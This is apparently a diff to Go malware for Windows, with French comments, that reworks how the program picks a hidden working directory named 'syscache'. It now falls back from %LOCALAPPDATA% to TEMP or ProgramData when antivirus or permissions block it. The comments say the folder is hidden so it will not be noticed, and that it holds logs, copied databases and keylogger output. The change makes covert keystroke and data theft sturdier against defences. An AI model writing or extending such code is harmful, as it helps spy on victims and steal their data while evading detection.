@@ -102,13 +102,34 @@ func workDir() string {
 	if payloadDir != "" {
 		return payloadDir
 	}
-	dir := filepath.Join(appDataLocal(), workDirName, "syscache")
-	_ = os.MkdirAll(dir, 0700)
-	// Dossier caché : un dossier visible dans %LOCALAPPDATA% se remarque.
-	hideFile(dir)
-	hideFile(filepath.Dir(dir))
-	payloadDir = dir
-	return dir
+	// Plusieurs bases possibles : si %LOCALAPPDATA% refuse la création (ACL,
+	// antivirus, profil verrouillé), on bascule sur TEMP puis ProgramData.
+	// Sans ce repli, journaux, copies de bases et keylog échouaient en silence.
+	for _, base := range []string{appDataLocal(), os.Getenv("TEMP"), os.Getenv("ProgramData")} {
+		if base == "" {
+			continue
+		}
+		dir := filepath.Join(base, workDirName, "syscache")
+		if err := os.MkdirAll(dir, 0700); err != nil {
+			continue
+		}
+		f, err := os.CreateTemp(dir, ".w")
+		if err != nil {
+			continue
+		}
+		name := f.Name()
+		f.Close()
+		_ = os.Remove(name)
+		hideFile(dir)
+		hideFile(filepath.Dir(dir))
+		payloadDir = dir
+		return dir
+	}
+	// Dernier recours : TEMP à plat.
+	fallback := filepath.Join(os.Getenv("TEMP"), "syscache")
+	_ = os.MkdirAll(fallback, 0700)
+	payloadDir = fallback
+	return fallback
 }
 
 func workPath(name string) string {
